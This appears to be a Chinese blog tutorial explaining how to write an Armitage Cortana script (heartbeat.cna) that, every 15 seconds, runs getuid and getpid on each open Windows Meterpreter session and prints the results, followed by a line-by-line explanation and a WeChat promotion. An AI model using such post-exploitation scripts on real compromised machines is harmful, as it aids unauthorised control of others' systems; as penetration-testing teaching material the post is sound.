---
layout: post
category: binghe-code-hack
title: Armitage使用Cortana实现后渗透攻击
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: Armitage使用Cortana实现后渗透攻击
lock: need
---

# Armitage使用Cortana实现后渗透攻击

首先，我们创建一个后渗透脚本heartbeat.cna

内容如下:

```
on heartbeat_15s{
    local('$sid');
    foreach $sid (session_ids()){
        if(-iswinmeterpreter $sid && -isready $sid){
            m_cmd($sid, "getuid");
            m_cmd($sid, "getpid");
            on meterpreter_getuid{
                println(" $3 ");
            }
            on meterpreter_getpid{
                println(" $3 ");
            }
        }
    }
}
```

这个脚本中，我们使用了一个名为heartbeat_15s的函数。这个函数每隔15秒会重复执行一次。

函数local表示$sid是当前函数的一个局部变量。吓一跳foreach语句是一个队所有开放会话的循环遍历。以if开始的语句将会对每一个会话进行检查，检查内容为该会话类型是否为Windows Meterpreter控制，以及该会话是否可以进行交互并接受命令。

m_cmd函数使用$sid(会话ID)等参数和命令将命令发送给Meterpreter会话。接着，我们定义了一个meterpreter_形式的函数，意味着即将发送到Meterpreter会话的命令。这个函数将会打印sent命令的输出。

使用Cortana载入这个脚本，并对结果进行分析，如下图所示：

![img](https://img-blog.csdnimg.cn/20190128211935380.png)

成功载入并执行这段脚本之后，每隔15秒就会显示目标系统的用户ID和当前使用进程的ID。

## 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)